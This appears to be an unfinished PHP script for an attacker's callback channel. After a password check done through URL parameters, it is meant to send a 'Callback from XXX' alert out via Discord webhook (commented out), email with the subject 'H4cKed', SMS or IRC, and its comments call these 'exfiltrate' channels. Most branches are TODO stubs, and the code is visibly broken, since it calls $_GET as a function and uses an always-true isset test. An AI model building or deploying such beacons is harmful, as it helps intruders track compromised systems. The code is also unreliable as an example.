<?php

// include creds files
include_once("creds.php");

if($_GET['user'] and $_GET['password']){
    $valid_creds = False;

    $user = $_GET['user'];
    $password = $_GET['password'];
    // check if the user and the password are good
    if(strcmp($user, USER) === 0 and strcmp($password, PASSWORD) === 0){
        $valid_creds = True;
    }else{
        $valid_creds = False;
    }
    
    if($valid_creds){
    
        // TODO: choose the exfiltrate channel : Discord, SMS, IRC, email, ...
    
        if(isset($_GET["chan"])!==null && $_GET["chan"]){
            $chan = $_GET("chan");
            switch($chan){
                case 'SMS';
                    // TODO send SMS
                    break;
                case 'DISC';
                    // TODO send DISC
                    // Need a discord server ...
                    /*
                    $url = "https://discordapp.com/api/webhooks/xxxxxxxxx";
                    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                    $POST = [ 'username' => 'whoishere', 'content' => 'Callback from XXX' ];

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    */
                    break;
                case 'EMAIL';
                    // TODO send EMAIL
                    $msg = "Callback from XXX";
                    $msg = wordwrap($msg,70);
                    mail("TBD","H4cKed",$msg);
                    break;
                case 'IRC';
                    // TODO send IRC
                    break;
            }
        }

    }
}
?>

